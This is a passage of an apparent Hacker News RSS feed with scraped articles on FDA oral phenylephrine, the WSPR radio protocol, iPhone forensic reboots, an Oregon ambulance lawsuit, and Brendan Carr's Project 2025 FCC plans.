<p>The FDA is seeking public comments on this proposed order. Instructions on how to submit comments are found in the proposed order available on OTC <a href="https://dps.fda.gov/omuf">Monographs@FDA</a>. If, after considering the comments, the FDA concludes oral phenylephrine is not effective as a nasal decongestant, the FDA will issue a final order removing oral phenylephrine from the OTC monograph, and drug products thereafter could no longer contain oral phenylephrine as a nasal decongestant. The FDA would provide manufacturers with appropriate time to either reformulate drugs containing oral phenylephrine or remove such drugs from the market.</p>

  <h2>Related Information</h2>
  
  

<p>###</p>
  <div data-quickedit-field-id="node/423839/field_generic_long_text/en/full">
      <p>Boilerplate</p>
      <p>The FDA, an agency within the U.S. Department of Health and Human Services, protects the public health by assuring the safety, effectiveness, and security of human and veterinary drugs, vaccines and other biological products for human use, and medical devices. The agency also is responsible for the safety and security of our nation’s food supply, cosmetics, dietary supplements, radiation-emitting electronic products, and for regulating tobacco products.</p>
    </div>
<hr>

<div>
  <h2>Inquiries</h2>
  
    
        
         
  </div>
 
<br>

<!--BEGIN QUALTRICS WEBSITE FEEDBACK SNIPPET-->
<!--BEGIN QUALTRICS WEBSITE FEEDBACK SNIPPET-->



              
                                            
              
            </div>

                                                                                  
            

                                                                                
            
                 </article>        
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ham Radio 101: What is WSPR? (162 pts)]]></title>
            <link>https://www.onallbands.com/ham-radio-101-what-is-wspr/</link>
            <guid>42082892</guid>
            <pubDate>Fri, 08 Nov 2024 00:44:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.onallbands.com/ham-radio-101-what-is-wspr/">https://www.onallbands.com/ham-radio-101-what-is-wspr/</a>, See on <a href="https://news.ycombinator.com/item?id=42082892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main-wrap">

			<p><span><a href="https://www.onallbands.com/category/ham-radio-101/" rel="category tag">HAM Radio 101</a></span></p>

			<p><span>

				Posted by 
				on June 7, 2024 at 1:43 pm
				
			</span></p><div>

				
<p>Let’s start with the basics:</p>



<ul>
<li>WSPR stands for Weak Signal Propagation Reporter—a protocol implemented in a computer program used for weak-signal radio communication between hams.</li>



<li>It lets users send and receive low-power transmissions for testing MF and HF propagation paths.</li>



<li>Pronounced “whisper,” WSPR was designed and written initially by Nobel Prize winner and <strong><a href="https://www.onallbands.com/category/technical-articles/ft8/" target="_blank" rel="noopener">FT8</a></strong> creator Joe Taylor, K1JT.</li>



<li>The software code is now open source and updated by a small team.</li>
</ul>



<p>If you’ve wondered if a band is open, WSPR can tell you.</p>



<figure><img fetchpriority="high" decoding="async" width="538" height="353" src="https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab.jpg" alt="wspr radio propagation display map" srcset="https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab.jpg 538w, https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab-300x197.jpg 300w, https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab-310x203.jpg 310w" sizes="(max-width: 538px) 100vw, 538px"><figcaption>(Image/Elizabeth Klinc, KE8FMJ)</figcaption></figure>



<p>As noted by Joe Taylor, K1JT, and Bruce Walker, W1BW, in their November 2010 <em>QST</em> article, “<strong><a href="https://www.arrl.org/files/file/History/History%20of%20QST%20Volume%201%20-%20Technology/QS11-2010-Taylor.pdf" target="_blank" rel="noopener">WSPRing Around the World</a></strong>,” WSPR transmits and receives but does not support normal types of on-the-air conversation. It sends and receives specially coded, beacon-like transmissions which establish whether particular propagation paths are open. Transmissions convey a callsign, station location, and power level using a compressed data format with strong forward error correction (FEC) and narrow-band, four-tone frequency-shift-keying (FSK).</p>



<p>K1JT notes that FEC greatly improves chances of copy and reduces errors to an extremely low rate. The signal bandwidth is only 6 Hz. Combined with randomized time-sharing, this assures that dozens of WSPR signals can fit into a 200 Hz segment of each amateur band. The WSPR protocol is effective at signal-to-noise ratios as low as -28 dB in a 2500 Hz bandwidth, about 10 to 15 dB below the threshold of audibility. On most bands, typical WSPR power levels are 5W or less (sometimes significantly less).</p>



<p>As the protocol has evolved, enhancements to WSPR have included upgrades in its decoder’s sensitivity, improved ability to handle larger numbers of signals in crowded sub-bands, and better detection of false decodes.</p>



<p>To take advantage of WSPR on the amateur bands, you’ll need a radio (one with USB audio is preferred) and a computer with an Internet connection. As users have pointed out online, you don’t need to transmit. Your system can still report what it hears.</p>



<p>The standard message is &lt;callsign&gt; + &lt;4 character locator&gt; + &lt;dBm transmit power&gt;. For example, “KE8FMJ EM89 37” is a signal from station KE8FMJ in Maidenhead grid cell “EM89,” sending 37 dBm, or about 5.0W.</p>



<p>Questions? Share them in the comments below or email me at <strong><a href="mailto:KE8FMJ@gmail.com" target="_blank" rel="noopener">KE8FMJ@gmail.com</a></strong>.</p>
				

 				
				

			</div>
			

			<p><span>Tags: <a href="https://www.onallbands.com/tag/wspr/" rel="tag">WSPR</a></span></p>

			
							<div>
					<p><img alt="" src="https://secure.gravatar.com/avatar/450861f063915f6aa3935edd99b50352?s=70&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/450861f063915f6aa3935edd99b50352?s=140&amp;d=mm&amp;r=g 2x" height="70" width="70" decoding="async"></p><p><span>Author: <a href="https://www.onallbands.com/author/elizabeth-klinc/" title="Posts by Elizabeth Klinc, KE8FMJ" rel="author">Elizabeth Klinc, KE8FMJ</a></span>
					   Elizabeth Klinc, KE8FMJ, is District Emergency Coordinator, D3 Ohio ARES.                   </p>
                   
				</div>
			
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cops suspect iOS 18 iPhones are communicating to force reboots (123 pts)]]></title>
            <link>https://www.macrumors.com/2024/11/07/ios-18-forcing-reboots-law-enforcement/</link>
            <guid>42081874</guid>
            <pubDate>Thu, 07 Nov 2024 22:34:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.macrumors.com/2024/11/07/ios-18-forcing-reboots-law-enforcement/">https://www.macrumors.com/2024/11/07/ios-18-forcing-reboots-law-enforcement/</a>, See on <a href="https://news.ycombinator.com/item?id=42081874">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main" id="maincontent"><article expanded="true"><div data-io-article-url="/2024/11/07/ios-18-forcing-reboots-law-enforcement/"><p>Law enforcement officials in Detroit, Michigan are warning other police officers about an alleged <a href="https://www.macrumors.com/guide/iphone/">iPhone</a> change that causes Apple devices stored for forensic examination to spontaneously restart, reports <em><a href="https://www.404media.co/police-freak-out-at-iphones-mysteriously-rebooting-themselves-locking-cops-out/">404 Media</a></em>.</p>
<p><img src="https://images.macrumors.com/t/ljGFewvyEgq-gnlepdNDK5Ey06A=/400x0/article-new/2023/02/iphone-passcode-green.jpg?lossy" srcset="https://images.macrumors.com/t/ljGFewvyEgq-gnlepdNDK5Ey06A=/400x0/article-new/2023/02/iphone-passcode-green.jpg?lossy 400w,https://images.macrumors.com/t/5hgeLbK13GANFRW0u_WM64DrHRo=/800x0/article-new/2023/02/iphone-passcode-green.jpg?lossy 800w,https://images.macrumors.com/t/SsND-QHMDaQXSk0t2viZd0H7hPg=/1600x0/article-new/2023/02/iphone-passcode-green.jpg 1600w,https://images.macrumors.com/t/n3UNULaT2DWb8XCvmW6GmgsTqqA=/2500x0/filters:no_upscale()/article-new/2023/02/iphone-passcode-green.jpg 2500w" sizes="(max-width: 900px) 100vw, 697px" alt="iphone passcode green" width="1600" height="900"><br>iPhones that are undergoing examination have apparently been rebooting, which makes them harder to unlock with brute force methods, and Michigan police think that it's due to a security feature that Apple added in <a href="https://www.macrumors.com/roundup/ios-18/">iOS 18</a>. A document found by <em>404 Media</em> speculates that iPhones running ‌iOS 18‌ are causing other iPhones to restart when those iPhones have been disconnected from a cellular network.</p>
<blockquote><p>The purpose of this notice is to spread awareness of a situation involving iPhones, which is causing iPhone devices to reboot in a short amount of time (observations are possibly within 24 hours) when removed from a cellular network. If the iPhone was in an After First Unlock (AFU) state, the device returns to a Before First Unlock (BFU) state after the reboot. This can be very detrimental to the acquisition of digital evidence from devices that are not supported in any state outside of AFU.</p>
<p>It is believed that the iPhone devices with iOS 18.0 brought into the lab, if conditions were available, communicated with the other iPhone devices that were powered on in the vault in AFU. That communication sent a signal to devices to reboot after so much time had transpired since device activity or being off network.</p></blockquote>
<p>After First Unlock, or AFU, denotes a device state where the owner has unlocked their device with a passcode or <a href="https://www.macrumors.com/guide/mask-face-id/">Face ID</a> at least one time since it was powered on. It is easier for law enforcement to get into a device in AFU mode with ‌iPhone‌ unlocking tools from companies like Cellebrite. A restart apparently makes the process more difficult.</p>
<p>The digital forensics lab that noticed the issue had several iPhones in AFU state reboot, including iPhones in Airplane mode and one in a faraday box. Since a faraday box blocks all electronic signals from reaching a device, there wouldn't be a way for an ‌iPhone‌ running ‌iOS 18‌ to communicate with an ‌iPhone‌ in a functional faraday box.</p>
<p>The police document speculates that this is "an iOS 18.0 security feature addition" because one device running ‌iOS 18‌ also rebooted after a period of isolation and inactivity. Several other devices in the same area did not, however, restart, and there is no evidence that Apple has added a feature that causes older iPhones to reboot when in contact with an ‌iPhone‌ running ‌iOS 18‌.</p>
<p>Law enforcement officials recommend isolating ‌iOS 18‌ devices from other iPhones that are in an AFU state as further testing takes place.<br>
</p>
<blockquote><p>The specific conditions that must exist for these reboots to occur is unknown and further testing and research would nee to be conducted to add more specifics to the new hurdle we are now faced with. What is known is that this new "feature" of some sort has increased the difficulty with forensically preserving digital evidence.</p></blockquote>
<p>Matthew Green, a cryptographer and Johns Hopkins professor told <em>404 Media</em> that the law enforcement officials' hypothesis about ‌iOS 18‌ devices is "deeply suspect," but he was impressed with the concept.</p>
<p>"The idea that phones should reboot periodically after an extended period with no network is absolutely brilliant and I'm amazed if indeed Apple did it on purpose," he said.</p>
<p><b>Update:</b> Apple added an "inactivity reboot" feature in the <a href="https://x.com/naehrdine/status/1854896392797360484">iOS 18.1 update</a>, but it does not relate to phone/wireless network state.</p>
<p><small>Note: Due to the political or social nature of the discussion regarding this topic, the discussion thread is located in our <a href="https://forums.macrumors.com/forums/political-news.218/">Political News</a> forum.  All forum members and site visitors are welcome to read and follow the thread, but posting is limited to forum members with at least 100 posts.</small></p>
</div></article><p><h2>Popular Stories</h2></p><div><h3><a href="https://www.macrumors.com/2024/11/05/apple-news-us-election-results-iphone/">Track 2024 U.S. Election Results Live on Your iPhone Lock Screen</a></h3><p>Tuesday November 5, 2024 5:02 am PST by <a href="https://www.macrumors.com/author/tim-hardwick/" rel="author">Tim Hardwick</a></p><p>Apple News is providing Live Activities support for the 2024 U.S. presidential election, allowing iPhone and iPad users to track electoral results in real time directly from their Lock Screen.
The feature is rolling out for U.S. users over the course of Election Day, November 5, providing continuous updates of the electoral count. So if you're interested, you don't need to repeatedly check...</p></div><div><h3><a href="https://www.macrumors.com/2024/11/04/everything-new-ios-18-2-beta-2/">Everything New in iOS 18.2 Beta 2</a></h3><p>Monday November 4, 2024 12:34 pm PST by <a href="https://www.macrumors.com/author/juli-clover/" rel="author">Juli Clover</a></p><p>Apple today seeded the second betas of upcoming iOS 18.2 and iPadOS 18.2 updates to developers, and Apple is continuing to refine the Apple Intelligence capabilities. There are also a handful of smaller features that are worth knowing about.
Find My
Find My has a new option to Share Item Location with an "airline or trusted person" that can help you locate something that you've misplaced....</p></div><div><h3><a href="https://www.macrumors.com/2024/09/13/apple-updating-icloud-terms-and-conditions/">Here's What's New in Apple's Updated iCloud Terms and Conditions Taking Effect Next Week</a></h3><p>Friday September 13, 2024 7:39 am PDT by <a href="https://www.macrumors.com/author/joe-rossignol/" rel="author">Joe Rossignol</a></p><p>Apple has started notifying users about an upcoming revision to its iCloud Terms and Conditions, which takes effect on Monday, September 16.
We compared the text of the upcoming iCloud Terms and Conditions with the current U.S. version from September 18, 2023 and identified four key changes:
"Apple ID" references have been changed to "Apple Account" throughout.
iCloud users must agree to ...</p></div><div><h3><a href="https://www.macrumors.com/2024/11/05/best-early-black-friday-ipad-deals-2024/">The Best Early Black Friday iPad Deals</a></h3><p>Black Friday is still a few weeks away, but you can already find great prices on numerous iPads, including the 9th generation iPad, 10th generation iPad, iPad Air, and iPad mini.
Note: MacRumors is an affiliate partner with some of these vendors. When you click a link and make a purchase, we may receive a small payment, which helps us keep the site running.
Of course, there is a chance that ...</p></div><div><h3><a href="https://www.macrumors.com/2024/11/04/ios-18-2-beta-2-siri-chatgpt-limit/">iOS 18.2 Beta 2 Shows Siri ChatGPT Limit, Offers 'Plus' Upgrade Option</a></h3><p>Monday November 4, 2024 10:54 am PST by <a href="https://www.macrumors.com/author/juli-clover/" rel="author">Juli Clover</a></p><p>With the second beta of iOS 18.2 that's available for developers today, Apple has further fleshed out the ChatGPT integration that's available with Siri. In the Settings app, there's now a section that shows the ChatGPT daily limit, and offers an option to upgrade to the paid ChatGPT Plus plan.
The beta includes an Advanced Capabilities section with a "Daily Limit" reading that shows up as...</p></div><div><h3><a href="https://www.macrumors.com/2024/11/06/best-black-friday-apple-watch-deals-2024/">The Best Early Black Friday Apple Watch Deals</a></h3><p>Black Friday is just around the corner, and Apple Watch deals have begun appearing ahead of the shopping holiday on November 29. In this article, we'll take a look at all of the best early Black Friday Apple Watch deals, including the new Series 10 models.
Note: MacRumors is an affiliate partner with some of these vendors. When you click a link and make a purchase, we may receive a small...</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ambulance hits cyclist, rushes him to hospital, then sticks him with $1,800 bill (293 pts)]]></title>
            <link>https://www.oregonlive.com/pacific-northwest-news/2024/11/ambulance-hits-oregon-cyclist-rushes-him-to-hospital-then-sticks-him-with-1800-bill-lawsuit-says.html</link>
            <guid>42081764</guid>
            <pubDate>Thu, 07 Nov 2024 22:22:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.oregonlive.com/pacific-northwest-news/2024/11/ambulance-hits-oregon-cyclist-rushes-him-to-hospital-then-sticks-him-with-1800-bill-lawsuit-says.html">https://www.oregonlive.com/pacific-northwest-news/2024/11/ambulance-hits-oregon-cyclist-rushes-him-to-hospital-then-sticks-him-with-1800-bill-lawsuit-says.html</a>, See on <a href="https://news.ycombinator.com/item?id=42081764">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-live="polite" id="main"><article id="arc-X2BCXLJ7EJH67JYAXNBMZCUFNY" data-type="article"><div><figure><div><picture><source media="(max-width: 500px)" srcset="https://www.oregonlive.com/resizer/v2/YJQFZULLBJENFPVJ7DUTBF6VNA.png?auth=a90033a24893ac8b0249ebb15840d671c83dc85146b37aa59746722522466547&amp;width=500&amp;quality=90 500w"><source media="(max-width: 800px)" srcset="https://www.oregonlive.com/resizer/v2/YJQFZULLBJENFPVJ7DUTBF6VNA.png?auth=a90033a24893ac8b0249ebb15840d671c83dc85146b37aa59746722522466547&amp;width=800&amp;quality=90 800w"><source srcset="https://www.oregonlive.com/resizer/v2/YJQFZULLBJENFPVJ7DUTBF6VNA.png?auth=a90033a24893ac8b0249ebb15840d671c83dc85146b37aa59746722522466547&amp;width=1280&amp;quality=90 1280w"><img src="https://www.oregonlive.com/resizer/v2/YJQFZULLBJENFPVJ7DUTBF6VNA.png?auth=a90033a24893ac8b0249ebb15840d671c83dc85146b37aa59746722522466547&amp;width=500&amp;quality=90" sizes="50vw" fetchpriority="high" loading="eager" alt="A black bicycle rests on its side on gray pavement. The front tire of a red ambulance is crushing the front wheel of the bicycle." decoding="async" height="600" width="300"></picture><figcaption><p>A photograph in a Rainier Police Department report shows William Hoesch's bicycle under the wheel of a Columbia River Fire &amp; Rescue ambulance in October 2022.<span>Rainier Police Department</span></p></figcaption></div></figure></div><div><p><span>By </span></p><ul><li><a href="https://www.oregonlive.com/staff/agreen/posts.html" title="Aimee Green at The Oregonian/OregonLive">Aimee Green | The Oregonian/OregonLive</a></li></ul></div><div><p id="TRQF4Z5NCVACXOBXZORI7427CM">An Oregon cyclist who was struck by an ambulance that made a right turn into him — fracturing his nose and leaving him with scrapes and other injuries across his body — has filed a $997,000 lawsuit against the ambulance provider after it scooped him up, drove him to the hospital and then billed him for the service, according to the suit.</p><p id="4XKTXQT5SJHBTDMMR6FVTYHXVE">Attorney Travis Mayor says the ambulance provider — Columbia River Fire &amp; Rescue — sent his client, 71-year-old William Hoesch, a $1,862 bill for the ambulance ride. That’s among about $47,000 in medical expenses that Hoesch has racked up so far and another $50,000 of medical costs he expects in the future, the suit states.</p><p id="YS6MURNLSFCEFEI5YJA7YHWQ6Y">Columbia River Fire &amp; Rescue declined to comment. Allstate Fire and Casualty Insurance Co. didn’t respond to a request for comment. The suit claims that Hoesch’s uninsured or underinsured motorist coverage is obligated to cover any damages that Columbia River Fire &amp; Rescue is unable to.</p><p id="JFQ7ZLUOSJB43CPPMTKZWKOO6Q">According to the lawsuit, Hoesch was pedaling through the small town of Rainier in Columbia County in October 2022 when he and the ambulance were traveling the same direction on a street that’s a mix of homes and businesses. The ambulance attempted to make a right turn onto another street, crashing into Hoesch and destroying his bicycle, according to the suit, which was filed Oct. 24.</p><figure><div><picture><source media="(max-width: 500px)" srcset="https://www.oregonlive.com/resizer/v2/YY6OPTXF3FFWDJJLMKHZWWLCLY.png?auth=a93e30d356b048a96c0755886a54acf18a5d5463a2c5b04d7879f768661ecaf1&amp;width=500&amp;quality=90 500w"><source media="(max-width: 800px)" srcset="https://www.oregonlive.com/resizer/v2/YY6OPTXF3FFWDJJLMKHZWWLCLY.png?auth=a93e30d356b048a96c0755886a54acf18a5d5463a2c5b04d7879f768661ecaf1&amp;width=800&amp;quality=90 800w"><source srcset="https://www.oregonlive.com/resizer/v2/YY6OPTXF3FFWDJJLMKHZWWLCLY.png?auth=a93e30d356b048a96c0755886a54acf18a5d5463a2c5b04d7879f768661ecaf1&amp;width=1280&amp;quality=90 1280w"><img src="https://www.oregonlive.com/resizer/v2/YY6OPTXF3FFWDJJLMKHZWWLCLY.png?auth=a93e30d356b048a96c0755886a54acf18a5d5463a2c5b04d7879f768661ecaf1&amp;width=500&amp;quality=90" sizes="50vw" fetchpriority="low" loading="lazy" alt="A man with gray hair is covered in a jacket and sweatshirt that are draped over his body. He is in a hospital bed, and there are bloody wounds on his face." decoding="async" height="600" width="300"></picture><figcaption><p>William Hoesch is pictured here after he and an ambulance collided while he was riding his bicycle in October 2022.<span>Submitted photo</span></p></figcaption></div></figure><p id="WFLKBHOG45ABLBX7CA57BPUXUA">The crash happened in front of Columbia River Fire &amp; Rescue’s Rainier station, as the ambulance was returning from a trip.</p><p id="XOZ5KRZZ6FA2ZKJEQOXFNHSXL4">According to police reports, the driver who struck Hoesch and a passenger in the ambulance estimated the ambulance was going between 2 mph and 10 mph when they heard a thump, stopped and saw Hoesch injured. Hoesch estimated to police that he was going 5 mph to 10 mph and said he didn’t think the ambulance was going to turn in front of him. His bicycle was crushed under the ambulance wheel.</p><p id="DVGLGLYO7FH75KH4WCTBCQ6GLU">Hoesch’s lawsuit also seeks $900,000 for pain and suffering, stating he suffered decreased range of motion, reduced grip strength and other symptoms.</p><figure><div><picture><source media="(max-width: 500px)" srcset="https://www.oregonlive.com/resizer/v2/Q7K3BXUW3JHERIHWCJGXD7OQIQ.png?auth=6696f7baca4dec2c4ee3a10419763f2ae5d3421b23088081b47bf9722fa1fbfb&amp;width=500&amp;quality=90 500w"><source media="(max-width: 800px)" srcset="https://www.oregonlive.com/resizer/v2/Q7K3BXUW3JHERIHWCJGXD7OQIQ.png?auth=6696f7baca4dec2c4ee3a10419763f2ae5d3421b23088081b47bf9722fa1fbfb&amp;width=800&amp;quality=90 800w"><source srcset="https://www.oregonlive.com/resizer/v2/Q7K3BXUW3JHERIHWCJGXD7OQIQ.png?auth=6696f7baca4dec2c4ee3a10419763f2ae5d3421b23088081b47bf9722fa1fbfb&amp;width=1280&amp;quality=90 1280w"><img src="https://www.oregonlive.com/resizer/v2/Q7K3BXUW3JHERIHWCJGXD7OQIQ.png?auth=6696f7baca4dec2c4ee3a10419763f2ae5d3421b23088081b47bf9722fa1fbfb&amp;width=500&amp;quality=90" sizes="50vw" fetchpriority="low" loading="lazy" alt="A photograph in a Rainier Police Department report shows William Hoesch's bicycle under the wheel of a Columbia River Fire &amp; Rescue ambulance in October 2022." decoding="async" height="600" width="300"></picture><figcaption><p>A Rainier Police Department report included this photo of the crash scene involving William Hoesch and a Columbia River Fire &amp; Rescue ambulance.<span>Rainier Police Department</span></p></figcaption></div></figure><p id="BDOCBSQW4VFP7HYJS4Z2Q2MSV4">Ambulance crashes involving cars, cyclists or pedestrians are rare but not unheard of in Oregon. Last month, the estate of 25-year-old Kelsey Seibel filed a $6 million lawsuit against South Lincoln Ambulance and Yachats Rural Fire Protection District, stating that one of their ambulances made a left turn in front of Seibel’s car on U.S. 101, killing Seibel in January 2024.</p><p id="T3DTV7PRVNDSJJXYWAQ2NDVSBY">And on July 18 at 1 a.m., Oregon State Police say an AMR ambulance hit a car with a flat tire parked on the side of Interstate 84 in Hood River County, <a href="https://www.oregonlive.com/crime/2024/07/at-least-8-people-killed-in-oregon-crashes-over-long-weekend.html">killing 55-year-old Geraldean Martin</a>, who was standing outside her car. No lawsuit has been filed in that case.</p><p id="4C6CBSWKC5BFVGEMEH6ZK7LEPU">— Aimee Green covers breaking news and the justice system. Reach her at 503-294-5119, <a href="mailto:agreen@oregonian.com">agreen@oregonian.com</a> or <a href="https://twitter.com/o_aimee">@o_aimee</a>.</p><section><ul data-testid="list"><li><a href="https://www.oregonlive.com/politics/2024/11/election-day-angst-portland-area-residents-mentally-prepare-for-the-results-whatever-they-may-be.html">Election Day angst: Portland-area residents mentally prepare for the results, whatever they may be</a></li><li><a href="https://www.oregonlive.com/crime/2024/10/landlord-evicts-man-charged-in-killing-newlywed-nurse-melissa-jubane.html">Landlord evicts man charged in killing of newlywed nurse Melissa Jubane</a></li><li><a href="https://www.oregonlive.com/crime/2024/10/wrongful-tow-escalates-when-retriever-towing-manager-slugs-customer-now-theyll-pay-12m.html">Wrongful tow escalates when Retriever Towing manager slugs customer. Now they’ll pay $1.2M</a></li><li><a href="https://www.oregonlive.com/education/2024/10/student-struck-other-student-80-times-as-portland-school-staff-stood-by-and-watched-2m-suit-says.html">Student struck other student 80 times as Portland school staff ‘stood by and watched,’ $2M suit says</a></li><li><a href="https://www.oregonlive.com/travel/2024/10/planes-at-pdx-ingest-birds-into-their-engines-every-year-massive-efforts-try-to-prevent-that.html">Planes at PDX ‘ingest’ birds into their engines every year. Massive efforts try to prevent that</a></li></ul></section></div><p>If you purchase a product or register for an account through a link on our site, we may receive compensation.<span> By using this site, you consent to our <a href="https://www.advancelocal.com/advancelocalUserAgreement/user-agreement.html" target="_blank" rel="noopener noreferrer">User Agreement</a> and agree that your clicks, interactions, and personal information may be collected, recorded, and/or stored by us and social media and other third-party partners in accordance with our <a href="https://www.advancelocal.com/advancelocalUserAgreement/privacy-policy.html" target="_blank" rel="noopener noreferrer">Privacy Policy.</a></span></p></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Trump's likely FCC chair wrote Project 2025 chapter on how he'd run the agency (113 pts)]]></title>
            <link>https://arstechnica.com/tech-policy/2024/11/trumps-likely-fcc-chair-wrote-project-2025-chapter-on-how-hed-run-the-agency/</link>
            <guid>42081726</guid>
            <pubDate>Thu, 07 Nov 2024 22:18:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/tech-policy/2024/11/trumps-likely-fcc-chair-wrote-project-2025-chapter-on-how-hed-run-the-agency/">https://arstechnica.com/tech-policy/2024/11/trumps-likely-fcc-chair-wrote-project-2025-chapter-on-how-hed-run-the-agency/</a>, See on <a href="https://news.ycombinator.com/item?id=42081726">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
            <article data-id="2061008">
  
  <header>
  <div>
    

    

    <p>
      Brendan Carr wants to preserve data caps, punish NBC, and give money to SpaceX.
    </p>

    

    <div>
            <p><a data-pswp-width="2000" data-pswp-height="1333" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr.jpg 2000w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-300x200.jpg 300w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-640x427.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-768x512.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-1536x1024.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-980x653.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-1440x960.jpg 1440w" data-cropped="false" href="https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr.jpg" target="_blank">
              <img width="2000" height="1333" src="https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr.jpg" alt="FCC Commissioner Brendan Carr speaking at a conference and gesturing with his hands." loading="eager" decoding="async" fetchpriority="high" srcset="https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr.jpg 2000w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-300x200.jpg 300w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-640x427.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-768x512.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-1536x1024.jpg 1536w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-980x653.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2020/05/getty-brendan-carr-1440x960.jpg 1440w" sizes="(max-width: 2000px) 100vw, 2000px">
            </a></p><div id="caption-1679836">
    
    <p>
      FCC Commissioner Brendan Carr speaks during the Conservative Political Action Conference (CPAC) in Maryland on Saturday, Feb. 29, 2020.

              <span>
          Credit:

          
          Getty Images | Bloomberg

                  </span>
          </p>
  </div>
          </div>

    <div>
    
    <p>
      FCC Commissioner Brendan Carr speaks during the Conservative Political Action Conference (CPAC) in Maryland on Saturday, Feb. 29, 2020.

              <span>
          Credit:

          
          Getty Images | Bloomberg

                  </span>
          </p>
  </div>
  </div>
</header>


  

  
      
    
    <div>
                      
                      
          
<p>The Republican who is likely to lead the Federal Communications Commission under President-elect Donald Trump detailed how he would run the agency when he wrote a chapter for the conservative Heritage Foundation's Project 2025. Carr, a longtime opponent of net neutrality rules and other broadband regulations, has also made his views clear numerous times when opposing rulemakings initiated by the current Democratic majority.</p>
<p>If Trump makes Carr the next FCC chairman after his inauguration, the FCC is likely to ditch consumer protection initiatives, like a recently announced inquiry into data caps, and attempt to regulate Big Tech companies while reducing regulation of Internet service providers. That could include forcing Big Tech companies to pay into a fund that subsidizes ISPs' broadband network construction.</p>
<p>A Carr-led FCC could also try to punish news organizations that are perceived to be anti-Trump. Just before the election, Carr <a href="https://x.com/BrendanCarrFCC/status/1852887210330341693">alleged</a> that NBC putting Kamala Harris on <em>Saturday Night Live</em> was "a clear and blatant effort to evade the FCC's Equal Time rule," and that the FCC should <a href="https://www.foxnews.com/politics/fcc-commissioner-rips-nbc-over-harris-last-minute-snl-appearance-plainly-designed-evade-rules">consider issuing penalties</a>. Despite Carr's claim, NBC did provide equal time to the Trump campaign.</p>
<p>Carr might also try to steer money to Elon Musk's Starlink system. Carr was a vocal opponent of the FCC decision to deny SpaceX's application for $886 million in government funding and <a href="https://docs.fcc.gov/public/attachments/FCC-23-105A1.pdf">claimed</a> that "President Biden gave federal agencies a greenlight" to punish Musk after he bought Twitter.</p>
<h2>FCC chair’s power</h2>
<p>Carr became an FCC commissioner in August 2017 after being nominated by then-President Trump. Carr was previously a legal adviser to Commissioner Ajit Pai and was briefly the FCC's general counsel during Pai's first year as chair in 2017.</p>
<p>Carr's <a href="https://static.project2025.org/2025_MandateForLeadership_CHAPTER-28.pdf">Project 2025 chapter</a>, published in 2023, said "the FCC's Chairperson serves as the agency's CEO and is empowered with significant authority that is not shared with other Commissioners." The chair "sets the FCC's agenda, decides what matters the agency will vote on and when, and has authority to organize and coordinate the FCC's work," Carr wrote. Although the president's nominations for each commissioner require Senate approval, the president can appoint any sitting commissioner to the chair spot without a Senate vote.</p>

          
                      
                  </div>
                    
        
          
    
    <div>
          
          
<p>The chair does not have unlimited power, of course. Congress can expand or reduce the FCC's authority by passing new laws or eliminating existing ones. FCC decisions are routinely challenged in court, and a recent <a href="https://arstechnica.com/tech-policy/2024/06/scotus-kills-chevron-deference-giving-courts-more-power-to-block-federal-rules">Supreme Court ruling</a> limited the regulatory authority of federal agencies.</p>
<p>Carr wants the FCC to regulate less, at least when it comes to Internet service providers. "The FCC is a New Deal–era agency. Its history of regulation tends to reflect the view that the federal government should impose heavy-handed regulation rather than relying on competition and market forces to produce optimal outcomes," he wrote.</p>
<p>The FCC, he said, "should engage in a serious top-to-bottom review of its regulations and take steps to rescind any that are overly cumbersome or outdated," and "focus its efforts on creating a market-friendly regulatory environment that fosters innovation and competition from a wide range of actors, including cable-based, broadband-based, and satellite-based Internet providers."</p>
<p>Chris Lewis, president and CEO of consumer advocacy group Public Knowledge, told Ars that Carr appears to be a leading candidate for the chairmanship "because of his experience and active presence in trying to chart a course for Republicans on telecom policy," with the Project 2025 chapter being a prime example.</p>
<p>Public Knowledge generally argues that the FCC should take a bigger role in regulating Internet providers. "The public expects that there is an agency protecting consumers over communications networks and I think it would be wise for the new majorities and new administration to be clearheaded about that," Lewis said.</p>
<h2>Carr targets Big Tech and online speech</h2>
<p>The FCC should have four primary goals, Carr wrote. Those goals are "reining in Big Tech, promoting national security, unleashing economic prosperity, and ensuring FCC accountability and good governance."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
